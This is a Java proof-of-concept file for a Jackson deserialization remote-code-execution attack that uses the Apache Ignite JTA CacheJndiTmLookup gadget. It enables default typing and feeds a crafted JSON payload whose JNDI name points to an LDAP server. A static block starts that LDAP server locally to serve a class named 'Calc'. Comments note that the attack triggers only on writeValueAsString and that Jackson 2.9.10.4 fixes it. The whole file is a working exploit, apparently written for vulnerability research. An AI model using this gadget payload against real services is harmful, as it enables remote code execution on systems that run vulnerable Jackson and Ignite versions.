package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 *
 * 比较鸡肋，需要调用writeValueAsString才能触发
 *
 * ignite jta gadget
 *
 * Mitre id:
 * Reporters:
 *
 * Fix will be included in:
 *
 * 2.9.10.4
 * Does not affect 2.10.0 and later
 *
 * <dependency>
 *       <groupId>org.apache.ignite</groupId>
 *       <artifactId>ignite-jta</artifactId>
 *       <version>2.8.0</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class IgniteJtaPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", {\"jndiNames\": [\"java.util.ArrayList\", [\"ldap://localhost:43658/Calc\"]]}]";
    Object o = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(o);
  }

}
